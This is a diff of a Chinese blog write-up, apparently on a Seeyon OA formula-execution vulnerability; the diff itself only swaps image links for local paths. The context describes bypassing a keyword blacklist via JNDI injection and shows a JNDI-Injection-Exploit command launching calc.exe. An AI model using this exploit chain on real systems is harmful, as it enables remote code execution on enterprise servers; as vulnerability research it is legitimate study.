@@ -680,13 +680,13 @@ arguments={&#34;formulaName&#34;:&#34;test&#34;,&#34;formulaType&#34;:&#34;2&#34
 </div>
 <p>经过测试，必须加上formulaType参数才可以。
 不加上
-<img class="tw-inline" loading="lazy" src='https://cdn.nlark.com/yuque/0/2024/png/26281757/1720191016861-5ca4bf4e-7460-4e7a-b3fe-17be4b31a374.png#averageHue=%23c18f44&clientId=ua6835479-23f6-4&from=paste&height=83&id=u13995473&originHeight=166&originWidth=1964&originalType=binary&ratio=2&rotation=0&showTitle=false&size=86173&status=done&style=none&taskId=ue881cc25-54b6-49e2-b27b-b34f5c002e1&title=&width=982'   alt="image.png"  >
+<img class="tw-inline" loading="lazy" src='./assets/1720191016861-5ca4bf4e-7460-4e7a-b3fe-17be4b31a374.png'   alt="image.png"  >
 加上
 根据提示，Method threw &lsquo;java.lang.NullPointerException&rsquo; exception. Cannot evaluate com.seeyon.ctp.common.po.formula.Formula.toString()
-<img class="tw-inline" loading="lazy" src='https://cdn.nlark.com/yuque/0/2024/png/26281757/1720192097310-0367c545-dcea-4f59-95cd-860164258268.png#averageHue=%23fbfbfb&clientId=ua6835479-23f6-4&from=paste&height=545&id=u70aa2cd9&originHeight=1090&originWidth=1842&originalType=binary&ratio=2&rotation=0&showTitle=false&size=185655&status=done&style=none&taskId=u72753861-0088-4073-b8f4-bdb19fb5aa8&title=&width=921'   alt="image.png"  >
+<img class="tw-inline" loading="lazy" src='./assets/1720192097310-0367c545-dcea-4f59-95cd-860164258268.png'   alt="image.png"  >
 应该是这里对这个属性进行了访问，所以必须给一个值。但是在这里下断点又无法直接命中，我估计是Java特殊的机制导致的？反射？</p>
 <h3 id="注意点" class="headerLink">
-    <a href="#%e6%b3%a8%e6%84%8f%e7%82%b9" class="header-mark"></a>注意点</h3><p>com/seeyon/ctp/common/formula/FormulaUtil.class<img class="tw-inline" loading="lazy" src='https://cdn.nlark.com/yuque/0/2024/png/26281757/1720192829723-3aeb0bc4-7d05-4461-b258-f587d71e1fba.png#averageHue=%23ddb373&clientId=ua6835479-23f6-4&from=paste&height=332&id=u9b59d00c&originHeight=664&originWidth=1692&originalType=binary&ratio=2&rotation=0&showTitle=false&size=231755&status=done&style=none&taskId=ud6e9402f-40c4-43d6-86e3-d6e3f5d618b&title=&width=846'   alt="image.png"  >
+    <a href="#%e6%b3%a8%e6%84%8f%e7%82%b9" class="header-mark"></a>注意点</h3><p>com/seeyon/ctp/common/formula/FormulaUtil.class<img class="tw-inline" loading="lazy" src='./assets/1720192829723-3aeb0bc4-7d05-4461-b258-f587d71e1fba.png'   alt="image.png"  >
 执行脚本前对关键字做了检测，不能直接使用Runtime等关键字，所以上面用了jndi注入。
 不过注意到这里是用<code>script.indexOf(keyword)</code>这种方式去检索字符串的，而且是黑名单，存在被绕过的风险。</p>
 <ol>
@@ -791,7 +791,7 @@ arguments={&#34;formulaName&#34;:&#34;test&#34;,&#34;formulaType&#34;:&#34;2&#34
       tw-scrollbar-thin
       "><span style="display:flex;"><span>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C <span style="color:#e6db74">&#34;calc.exe&#34;</span> -A <span style="color:#e6db74">&#34;192.168.10.249&#34;</span></span></span></code></pre>
 </div>
-<p><img class="tw-inline" loading="lazy" src='https://cdn.nlark.com/yuque/0/2024/png/26281757/1720195270387-7094d47d-d75f-4c73-848d-befdc1340a5e.png#averageHue=%231d2228&clientId=ua6835479-23f6-4&from=paste&height=101&id=kILv9&originHeight=202&originWidth=1778&originalType=binary&ratio=2&rotation=0&showTitle=false&size=88842&status=done&style=none&taskId=u303ec805-6310-406f-8ee5-60f3fe0520f&title=&width=889'   alt="image.png"  >
+<p><img class="tw-inline" loading="lazy" src='./assets/1720195270387-7094d47d-d75f-4c73-848d-befdc1340a5e.png'   alt="image.png"  >
 这里我的致远JDK版本过高，暂时么有复现，不过漏洞就是这样，剩下的只是不同环境下的利用问题。</p>
 <h2 id="后话" class="headerLink">
     <a href="#%e5%90%8e%e8%af%9d" class="header-mark"></a>后话</h2><p>高版本jndi绕过：
